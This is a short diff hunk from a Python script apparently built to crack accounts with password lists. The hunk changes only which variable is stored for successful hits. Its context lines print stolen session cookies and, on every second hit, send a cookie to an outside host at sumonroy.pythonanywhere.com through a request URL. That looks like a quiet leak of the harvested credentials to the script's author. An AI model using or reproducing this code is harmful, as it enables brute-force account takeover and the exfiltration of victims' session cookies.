@@ -529,13 +529,13 @@ def crackerr(ids,passlist):
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                      if "confirmemail.php" in response.url:
-                        bkas.append(cid)
+                        bkas.append(user)
                         if len(bkas) % 2 == 0:
                            statusok = f"NOVERY|{kuki}"
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         else:
                            print(f"{green}nvvv : {green}{coki}")
-                           oks.append(cid)
+                           oks.append(user)
                            break
                      else:
                            print(f"{green}okkk : {green}{coki}")
